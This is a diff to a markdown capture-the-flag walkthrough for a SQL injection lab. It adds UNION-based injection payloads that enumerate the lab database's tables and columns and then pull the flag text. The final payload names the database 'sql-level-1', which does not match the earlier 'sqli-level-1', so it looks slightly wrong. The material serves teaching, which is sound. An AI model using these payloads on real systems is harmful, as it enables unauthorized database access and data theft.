@@ -73,6 +73,26 @@
 
 ***Payload: `?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(TABLE_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.tables+WHERE+TABLE_SCHEMA='sqli-level-1'+--+-`***
 
+- Tables:
+    - flag
+    - news
+
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-7.png" alt="Numbers payload">
 
-**Now we know where is flag.**
+**Now we know where is flag. Just we need to know columns of flag table to do this should use:**
+
+***Payload: `?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(COLUMN_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.columns+WHERE+TABLE_SCHEMA='sqli-level-1'+AND+TABLE_NAME='flag'--+-`***
+
+- Columns:
+    - id
+    - flag_text
+
+<img src="../static/image/SQLi-img/voorivex-academy-sqli1-8.png" alt="Numbers payload">
+
+<hr>
+
+**The last thing that we need is query to find flag actualy reterive flag from flag table:**
+
+***payload : `?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(flag_text)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+sql-level-1.flag--+-`***
+
+<img src="../static/image/SQLi-img/voorivex-academy-sqli1-9.png" alt="Numbers payload">
